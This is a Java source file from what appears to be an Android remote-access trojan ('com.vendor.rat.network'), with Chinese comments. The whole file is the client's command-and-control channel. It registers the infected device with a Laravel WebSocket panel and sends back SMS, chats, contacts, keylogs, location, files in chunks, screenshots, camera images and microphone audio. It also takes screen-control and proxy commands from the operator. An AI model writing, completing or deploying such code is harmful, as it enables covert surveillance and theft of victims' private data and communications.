package com.vendor.rat.network;

import android.util.Log;

import com.google.gson.Gson;
import com.google.gson.JsonObject;

import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

/**
 * WebSocket 客户端 — 适配 Laravel Swoole WebSocket 协议
 *
 * Laravel 协议格式:
 *   设备端 itype = "Slr_client"
 *   路由字段: itype + subc
 *   设备标识: pid (phoneId/deviceId)
 *
 * 功能:
 *   - 连接 Laravel Swoole WebSocket (ws://host:8081)
 *   - 首条 ping 消息即完成设备注册 (DeviceHandler 自动 registerDevice)
 *   - 心跳: subc="ping" + URL-encoded 设备状态
 *   - 数据上报: subc="sms/screen/files/cam/mic/..." + 对应数据
 *   - 接收 Panel 下发的控制命令 (type="screencomd" 等)
 *   - 自动重连 (指数退避)
 */
public class WebSocketClient extends WebSocketListener {

    private static final String TAG = "WebSocketClient";
    private static final int NORMAL_CLOSURE = 1000;

    // Laravel 协议常量 (WebSocketConfig::clientTypes())
    public static final String ITYPE_DEVICE = "Slr_client";
    public static final String SUBC_PING = "ping";
    public static final String SUBC_CAM = "cam";
    public static final String SUBC_MIC = "mic";
    public static final String SUBC_THUMB = "thumb";
    public static final String SUBC_DOWN = "down";
    public static final String SUBC_SRCH = "srch";
    public static final String SUBC_PROXY = "proxy";

    private final String wsUrl;
    private final String deviceId;
    private final Gson gson;

    private OkHttpClient client;
    private WebSocket webSocket;
    private final AtomicBoolean connected = new AtomicBoolean(false);
    private CommandListener commandListener;

    // 重连参数
    private int reconnectAttempts = 0;
    private static final int MAX_RECONNECT_ATTEMPTS = 10;
    private static final long BASE_RECONNECT_DELAY = 3000L; // 3 秒
    private final ScheduledExecutorService reconnectExecutor = Executors.newSingleThreadScheduledExecutor();

    // 首次连接时的初始状态参数 (由 KeepHeartThread 设置)
    private volatile String initialStatusParams;

    public WebSocketClient(String wsUrl, String deviceId) {
        this.wsUrl = wsUrl;
        this.deviceId = deviceId;
        this.gson = new Gson();

        this.client = new OkHttpClient.Builder()
            .connectTimeout(60, TimeUnit.SECONDS)
            .readTimeout(0, TimeUnit.MILLISECONDS) // 无超时
            .pingInterval(30, TimeUnit.SECONDS)
            .build();
    }

    /**
     * 连接 WebSocket 服务器
     */
    public void connect() {
        if (connected.get()) return;
        if (wsUrl == null || wsUrl.isEmpty()) {
            Log.w(TAG, "WebSocket URL is null, skipping connect");
            return;
        }

        Request request = new Request.Builder()
            .url(wsUrl)
            .addHeader("X-Device-Id", deviceId)
            .build();

        webSocket = client.newWebSocket(request, this);
        Log.d(TAG, "Connecting to: " + wsUrl);
    }

    /**
     * 断开连接
     */
    public void disconnect() {
        if (webSocket != null) {
            webSocket.close(NORMAL_CLOSURE, "Client disconnect");
        }
        connected.set(false);
    }

    /**
     * 发送原始消息
     */
    public boolean send(String message) {
        if (webSocket != null && connected.get()) {
            return webSocket.send(message);
        }
        return false;
    }

    // ============ Laravel 协议消息方法 ============

    /**
     * 构建带 itype/subc/pid 的基础消息
     */
    private JsonObject newBaseMessage(String subc) {
        JsonObject msg = new JsonObject();
        msg.addProperty("itype", ITYPE_DEVICE);
        msg.addProperty("subc", subc);
        msg.addProperty("pid", deviceId);
        return msg;
    }

    /**
     * 发送心跳 (subc="ping")
     * Laravel DeviceHandler 用 parse_str() 解析 msg 字段
     *
     * @param encodedStatus URL-encoded 设备状态参数
     *   如: phone_name=Huawei+P40&model=ELS-AN00&battery_charge=85%25&accessibility=1
     */
    public void sendPing(String encodedStatus) {
        JsonObject msg = newBaseMessage(SUBC_PING);
        msg.addProperty("msg", encodedStatus != null ? encodedStatus : "");
        send(msg.toString());
    }

    /**
     * 通用数据上报 (msg 字段)
     * 适用于: sms, chat, files, savefiles, snap, loc, loadapps, loadcontacts, injapps, klogs, klogsdate
     */
    public void sendData(String subc, String data) {
        JsonObject msg = newBaseMessage(subc);
        msg.addProperty("msg", data != null ? data : "");
        send(msg.toString());
    }

    /**
     * 屏幕数据上报
     * 对齐 DeviceHandler 的 screen/screenshot 处理: img + wmob + hmob
     */
    public void sendScreen(String subc, String imgBase64, int width, int height) {
        JsonObject msg = newBaseMessage(subc);
        msg.addProperty("img", imgBase64);
        msg.addProperty("wmob", width);
        msg.addProperty("hmob", height);
        send(msg.toString());
    }

    /**
     * 相机数据上报
     * 对齐 DeviceHandler 的 cam 处理: img 字段
     */
    public void sendCamera(String imgBase64) {
        JsonObject msg = newBaseMessage(SUBC_CAM);
        msg.addProperty("img", imgBase64);
        send(msg.toString());
    }

    /**
     * 麦克风数据上报
     * 对齐 DeviceHandler 的 mic 处理: voip 字段
     */
    public void sendMic(String audioData) {
        JsonObject msg = newBaseMessage(SUBC_MIC);
        msg.addProperty("voip", audioData);
        send(msg.toString());
    }

    /**
     * 缩略图上报
     * 对齐 DeviceHandler 的 thumb 处理: msg + pth 字段
     */
    public void sendThumb(String data, String path) {
        JsonObject msg = newBaseMessage(SUBC_THUMB);
        msg.addProperty("msg", data);
        msg.addProperty("pth", path);
        send(msg.toString());
    }

    /**
     * 文件下载分块上报
     * 对齐 DeviceHandler 的 down 处理
     */
    public void sendFileChunk(String filename, String filedata, long totalSize,
                              long sentSize, int chunkNumber, String filehash, String filepath) {
        JsonObject msg = newBaseMessage(SUBC_DOWN);
        msg.addProperty("filename", filename);
        msg.addProperty("filedata", filedata);
        msg.addProperty("totalSize", totalSize);
        msg.addProperty("sentSize", sentSize);
        msg.addProperty("chunkNumber", chunkNumber);
        msg.addProperty("filehash", filehash);
        msg.addProperty("filepath", filepath);
        send(msg.toString());
    }

    /**
     * 文件搜索结果上报
     * 对齐 DeviceHandler 的 srch 处理: pths + stype 字段
     */
    public void sendSearchResult(String paths, String searchType) {
        JsonObject msg = newBaseMessage(SUBC_SRCH);
        msg.addProperty("pths", paths);
        msg.addProperty("stype", searchType);
        send(msg.toString());
    }

    /**
     * 代理状态上报
     * 对齐 DeviceHandler 的 proxy 处理
     */
    public void sendProxy(String ctype, JsonObject extraFields) {
        JsonObject msg = newBaseMessage(SUBC_PROXY);
        msg.addProperty("ctype", ctype);
        if (extraFields != null) {
            for (String key : extraFields.keySet()) {
                msg.add(key, extraFields.get(key));
            }
        }
        send(msg.toString());
    }

    /**
     * 设置初始状态参数 (onOpen 时发送)
     */
    public void setInitialStatusParams(String params) {
        this.initialStatusParams = params;
    }

    /**
     * 重连 (使用 ScheduledExecutorService 避免线程泄漏)
     */
    public void reconnect() {
        if (reconnectAttempts >= MAX_RECONNECT_ATTEMPTS) {
            Log.e(TAG, "Max reconnect attempts reached, resetting counter");
            reconnectAttempts = 0;
            return;
        }

        long rawDelay = BASE_RECONNECT_DELAY * (long) Math.pow(2, reconnectAttempts);
        final long delay = Math.min(rawDelay, 60000L); // 最大 60 秒

        reconnectAttempts++;
        Log.d(TAG, "Reconnecting in " + delay + "ms (attempt " + reconnectAttempts + ")");

        reconnectExecutor.schedule(this::connect, delay, TimeUnit.MILLISECONDS);
    }

    // ============ WebSocketListener 回调 ============

    @Override
    public void onOpen(WebSocket ws, Response response) {
        connected.set(true);
        reconnectAttempts = 0;
        Log.i(TAG, "WebSocket connected to: " + wsUrl);

        // 首条 ping 消息即完成设备注册
        // Laravel MessageRouter → DeviceHandler.handle() → registerDevice(fd, phoneId)
        String status = initialStatusParams != null ? initialStatusParams : "";
        sendPing(status);
        Log.d(TAG, "Registration ping sent: pid=" + deviceId);
    }

    @Override
    public void onMessage(WebSocket ws, String text) {
        Log.d(TAG, "Received: " + text);

        if (commandListener == null) return;

        try {
            JsonObject json = gson.fromJson(text, JsonObject.class);
            String type = json.has("type") ? json.get("type").getAsString() : null;
            String subc = json.has("subc") ? json.get("subc").getAsString() : null;

            // 服务端心跳响应，忽略
            if ("pong".equals(type)) {
                return;
            }

            commandListener.onCommand(type, subc, json);
        } catch (Exception e) {
            Log.e(TAG, "Failed to parse server message: " + text, e);
        }
    }

    @Override
    public void onClosing(WebSocket ws, int code, String reason) {
        connected.set(false);
        Log.d(TAG, "WebSocket closing: " + code + " " + reason);
    }

    @Override
    public void onClosed(WebSocket ws, int code, String reason) {
        connected.set(false);
        Log.d(TAG, "WebSocket closed: " + code + " " + reason);
        if (code != NORMAL_CLOSURE) {
            reconnect();
        }
    }

    @Override
    public void onFailure(WebSocket ws, Throwable t, Response response) {
        connected.set(false);
        Log.e(TAG, "WebSocket failure", t);
        reconnect();
    }

    // ============ Getters & Setters ============

    public boolean isConnected() { return connected.get(); }
    public String getDeviceId() { return deviceId; }

    public void setCommandListener(CommandListener listener) {
        this.commandListener = listener;
    }

    /**
     * 命令监听接口
     * Panel 通过 PanelSendHandler 下发命令，格式:
     *   {"type":"screencomd", "subc":"Screen", "comdtype":"SM"}
     */
    public interface CommandListener {
        void onCommand(String type, String subc, JsonObject payload);
    }
}
